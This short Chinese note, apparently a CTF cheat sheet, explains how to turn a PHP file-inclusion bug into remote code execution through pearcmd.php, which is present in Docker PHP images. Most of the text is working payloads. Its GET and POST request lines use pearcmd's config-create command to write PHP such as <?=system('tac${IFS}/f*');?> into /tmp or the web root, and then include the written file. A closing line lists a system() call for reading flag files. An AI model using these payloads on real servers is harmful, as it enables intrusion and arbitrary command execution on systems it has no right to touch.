---
title: pearcmd
date: 2024-01-09 14:41:45
tags:
categories:
---

在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在**/usr/local/lib/**php。**/usr/local/lib/php**/pearcmd.php



要利用这个pearcmd.php需要满足几个条件：

（1）.要开启register_argc_argv这个选项在Docker中使自动开启的

（2）.要有文件包含的利用



config-create命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。

?+config-create+/



**例payload**

Get

`/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php`

上面是将<?=phpinfo()?>写到/tmp/hello.php,然后我们再使用文件包含进行包含我们之前写入的文件（hello.php）就可以了。



POST可用 再传参就行

`/?+config-create+/&/<?=system('tac${IFS}/f*');?>+/var/www/html/temp`

**/var/www/html**/temp 传这里

传参：`a=localhost/usr/local/lib/php/pearcmd.php&1`



**常见写入：**

system('tac${IFS}/f*')
